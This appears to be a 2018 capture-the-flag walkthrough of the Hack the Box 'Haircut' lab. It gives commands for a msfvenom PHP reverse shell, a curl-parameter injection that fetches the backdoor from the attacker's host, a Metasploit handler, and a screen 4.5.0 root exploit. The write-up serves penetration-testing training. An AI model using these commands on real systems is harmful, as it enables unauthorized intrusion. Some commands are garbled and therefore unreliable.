@@ -1,0 +1,118 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box Challenge: Haircut Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-haircut-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-04-01T16:20:07+00:00">April 1, 2018</time><time class="updated" datetime="2025-07-06T18:40:13+00:00">July 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<strong>Haircut</strong>” which is categories as retired lab presented by <strong>Hack the Box</strong> for making online penetration practices. Solving challenges in this lab is not that much easy until you don’t have some knowledge of WAPT. Let start and learn how to analyze any vulnerability in a network then exploit it for retrieving desired information.</span></p>
+<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
+<p><span style="color: #000000;"><strong>Task</strong>: find user.txt and root.txt file on the victim’s machine.</span></p>
+<h3><span style="color: #800000;">Initial Reconnaissance and Web Enumeration</span></h3>
+<p><span style="color: #000000;">Since these labs are online accessible therefore they have static IP. The IP of Haircut is <strong>10.10.10.24</strong> so let’s initiate with nmap port enumeration.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.24</pre>
+<p><span style="color: #000000;">From the given below image, you can observe we found port 22 and 80 are open in the victim’s network.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SO4urZXQpJA/WsDxi0XpYQI/AAAAAAAAV64/BAMrSuGU_OQEAJCCDHxj8XG7L_VltZHVACLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">Knowing port 80 is open to the victim’s network we preferred to explore his IP in a browser and the following image as shown below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-CGUVyp8Awac/WsDxnpfdFyI/AAAAAAAAV7o/PmJYf8QntaciSt6ldlE1vGZRoQZ9m6kTACLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">Then I preferred to use dirbuster tool and chose <strong>directory list 2-3 medium.txt</strong> file for directory brute force attack on <strong>http://10.10.10.24</strong> for PHP file extension.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GVCeErn2rQA/WsDxp_olyUI/AAAAAAAAV78/TUFzSj3vRGozVAqyaZe3__TA6TJO6RMygCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">As a result, it found the<strong> uploads </strong>directory with 403 response and an <strong>exposed.php </strong>file with 200 ok response.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-rRDDvJeGoGM/WsDxp1dHsWI/AAAAAAAAV74/ihjc-J6cth0yL1V_i-vGNpLa3uBaqU1HgCLcBGAs/s1600/4.png"/></span></p>
+<h3><span style="color: #800000;">Discovering the CURL Injection Vulnerability</span></h3>
+<p><span style="color: #000000;">When we explored <strong>http://10.10.10.24/exposed.php</strong> we found a search page for finding the location of any hairdresser’s.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-deYt_L_SOCU/WsDxq1mcO4I/AAAAAAAAV8A/i8trH4oY1os2-rrP9Qxo0XkAwt3xOXRZgCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">For testing, I search for google.com and received very uncommon result but when I inspect the following code I notice the word “<strong>CURL</strong>” which might be pointing towards running curl service in targets system. As we known curl have upload or download option and hence here we can transfer our backdoor to targets system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mf4VKFJRWow/WsDxrButi_I/AAAAAAAAV8E/s6AWLqJh2V85p8cLuT0r2p5ALCEo_xqOwCLcBGAs/s1600/7.png"/></span></p>
+<h3><span style="color: #800000;">Exploiting File Upload via CURL</span></h3>
+<p><span style="color: #000000;">Without wasting time I generated a PHP backdoor with help of msfvenom and <strong>start multi/handler</strong> inside the Metasploit framework.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4321 -f raw</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-JnmXfFWRGck/WsDxrpnzTeI/AAAAAAAAV8I/niXg13Sx6_4SzBJc1-Kb1OvA5vVT85QKgCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">Now we need to transfer our <strong>backdoor </strong>file to the target system therefore first we need to <strong>run python server</strong> on port 80 using the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-TY96qZeCR_w/WsDxrhib0eI/AAAAAAAAV8M/FFgvVFkv_sAUBKtHYlP5fJ1pEIPTooj1QCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">First I tried to upload the file directly through browser http://10.10.10.24/exposed.php but got failed at that point I <strong>use burpsuite</strong> for fetching HTTP post request and send it to <strong>the repeater</strong>. Then I run curl command for downloading any file from the given path by <strong>omitting word “curl”</strong> as shown below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">formurl = -o uploads/revshell.php http://10.10.14.3/revshell.php</pre>
+<p><span style="color: #000000;"><strong>uploads/revshell.php </strong>denotes the path where our backdoor reverse.php file will be uploaded.</span></p>
+<p><span style="color: #000000;"><strong>http://10.10.14.3/revshell.php </strong>denotes the path for downloading the file from here.</span></p>
+<p><span style="color: #000000;">After then click on <strong>the Go</strong> tab and found that our file is successfully transferred into the target’s system.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-pYbLUKp7aYs/WsDxiCrAngI/AAAAAAAAV6w/93DICqxDSYoR8V_NrT1a9N9z3LCPGjgzwCLcBGAs/s1600/10.1.png"/></span></p>
+<p><span style="color: #000000;">As the revshell.php file is successfully transferred into the target’s system but we need to execute that file for getting the reverse connection, therefore, I simply run following the path in a web browser.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.10.24/uploads/revshell.php</pre>
+<h3><span style="color: #800000;">Gaining Initial Foothold</span></h3>
+<p><span style="color: #000000;">After executing uploaded backdoor file come back to the Metasploit framework and wait for the meterpreter session.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf use exploit/multi/handler
+msf exploit(multi/handler) set payload php/meterpreter/reverse_tcp
+msf exploit(multi/handler) set lhost 10.10.14.3
+msf exploit(multi/handler) set lport 4321
+msf exploit(multi/handler) exploit</pre>
+<p><span style="color: #000000;">From given below image you can observe <strong>meterpreter session 1</strong> opened for accessing victim tty shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter&gt;sysinfo</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qQuYN3hwLu0/WsDxiunQgYI/AAAAAAAAV60/7V-SBsA-JXgJHbnCmN1E6CXMuhyZsALegCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">Now let’s finished the task by grabbing user.txt and root.txt file. First I move into the home directory and check available files and directories inside it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
+ls</pre>
+<p><span style="color: #000000;">here I got a directory maria and after exploring it we found so many files and directory, at last, I fetch the user.txt file from inside /<strong>maria/Desktop/</strong> and use cat command for reading.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat user.txt</pre>
+<h5><span style="color: #000000;"><strong>Our 1<sup>st</sup> challenges finished successfully now move for 2<sup>nd</sup> challenge.</strong></span></h5>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ZkjcqHYMNF8/WsDxjKF-dfI/AAAAAAAAV68/aYqoNMn8MKEkNZC9UsOBH3ZMpU19_qvvQCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">For spawning proper tty shell of target’s system we need to import python file, therefore, I run following command inside the meterpreter shell</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<h3><span style="color: #800000;">Privilege Escalation via Screen 4.5.0 Exploit</span></h3>
+<p><span style="color: #000000;">Then using the following command we got all files and directories having root permission.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">find / -perm -4000 -user root -exec ls -ld {} \; 2&gt;/dev/null</pre>
+<p><span style="color: #000000;">Here I notice <strong>/usr/bin/screen-4.5.0</strong> now let’s check its exploit if available.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-895M3ywup1s/WsDxkSxNAzI/AAAAAAAAV7E/OkPImo-IN3sDbW4dtlFrYFv6Co9wEOaFACLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">In a new terminal, we look for any exploit present in exploitdb for screen 4.5.0 with help of searchsploit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit screen 4.5.0</pre>
+<p><span style="color: #000000;">From given below image you can observe the highlighted <strong>exploit 41154.sh</strong> which is a shell script for local privilege escalation.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-BKcvSYWM7Bo/WsDxkBrWz1I/AAAAAAAAV7A/iC9ee1xlO_IRtibYWtf_-XuAhm2i2ooZwCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">When I didn’t find any appropriate method to execute this shell script for post exploitation then I go with manual compilation and review its code using cat command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /usr/share/exploitdb/exploits/linux/local/41154.sh</pre>
+<h3><span style="color: #800000;">Manual Exploit Compilation and Execution</span></h3>
+<p><span style="color: #000000;">If you will notice the following code then you will observe this script is written in C language and we have divided it into three part for manual compilation.</span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Copy Yellow</strong> highlighted the code and past it in a text document and save it as <strong>libhax.c</strong></span></li>
+<li><span style="color: #000000;"><strong>Copy</strong> <strong>Orang</strong>e highlighted the code and past it in a text document and save it as <strong>rootshell</strong>.<strong>c</strong></span></li>
+</ul>
+<p><span style="color: #000000;">At last <strong>copy remaining</strong> code and past it in a text document and save it as <strong>41154.sh</strong> </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Ui8tANVpMJs/WsDxkanrZqI/AAAAAAAAV7I/ENdFkUnP0sALGaiN5Q6kG_CWagAM5O7gACLcBGAs/s1600/14.png"/></span></p>
+<p><span style="color: #000000;">From given below image you can see I have pasted above copied inside <strong>rootshell.c</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lKI4tjQ_3wg/WsDxlebigCI/AAAAAAAAV7U/DSziBStSvs0Kd3B3otW61hS6Jbb0600AgCLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">From given below image you can see I have pasted above copied inside <strong>libhax.c</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L6UlAmep198/WsDxlHRtTxI/AAAAAAAAV7M/ok0obY8OKoMSZhZrbCZhr6i3wCK9Ab9GgCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">You can see I have pasted above remaining copied inside <strong>41154.sh</strong> and save all three text document on the desktop in a new <strong>folder shell</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wCDa_mTkcn8/WsDxlVpteSI/AAAAAAAAV7Q/GXLP9Fg3wWkGksb_ePeaDhmuwcWKOt7wACLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">Let’s compile our C program file manually in our local system using gcc as given below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gcc -fPIC -shared -ldl -o libhax.so libhax.c</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-eV0loDFdlmk/WsDxmCKpxmI/AAAAAAAAV7Y/4EkdBGn4LoYHx8N9k6Jisq9G4AvyaQDFQCLcBGAs/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">Similarly compile rootshell.c file through the following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gcc -o rootshell rootshell.c</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-uaJmsR6CtN8/WsDxm9QKAOI/AAAAAAAAV7g/y0uOqAFvWg0aCjGQ4NGOgyqhDjFD8HrPwCLcBGAs/s1600/23.png"/></span></p>
+<p><span style="color: #000000;">From given below image you can see all files we have stored in our folder shell, now let’s upload them into the target’s system through our previous meterpreter session.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tI-CGXoMArM/WsDxnCeDdyI/AAAAAAAAV7k/7YphqFIbCGgedIyx9Ix-dB1IZOzyvO8LQCLcBGAs/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">Since we /tmp has read and write permission, therefore, we are uploading all files in /tmp directory by executing following command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+upload /root/Desktop/shell .</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_p7WMuiJfPM/WsDxorQ6H-I/AAAAAAAAV7w/3wUBpripO-U4epL-ZpOpXNnyTQHKwB3PwCLcBGAs/s1600/25.1.png"/></span></p>
+<p><span style="color: #000000;">Again for spawning proper tty shell of target’s system, we need to import python file, therefore, I run following command inside the meterpreter shell</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;">Open 41154.sh file as it contains a command for getting root privilege as shown below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat 41154.sh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-iyN8UXg_BsU/WsDxobgvj9I/AAAAAAAAV7s/OADxYV9dOCgl2pqtOYYyiBG725AKdcTPQCLcBGAs/s1600/25.png"/></span></p>
+<h3><span style="color: #800000;">Capturing the Root Flag</span></h3>
+<p><span style="color: #000000;">Execute the following command and get the root.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /etc
+unmask 000
+-D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
+cd root</pre>
+<p><span style="color: #000000;">Here I got root.txt file now using cat command let open this file and finished our 2<sup>nd</sup> challenge.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat root.txt</pre>
+<p><span style="color: #000000;"><strong>Wonderful!!</strong> We had completed the task and hacked this box.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-AhxqhwsfGZo/WsDxo30AdaI/AAAAAAAAV70/mwoZ88rWRi4X3MuhchRRHpDyMrV8q-eiQCLcBGAs/s1600/26.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
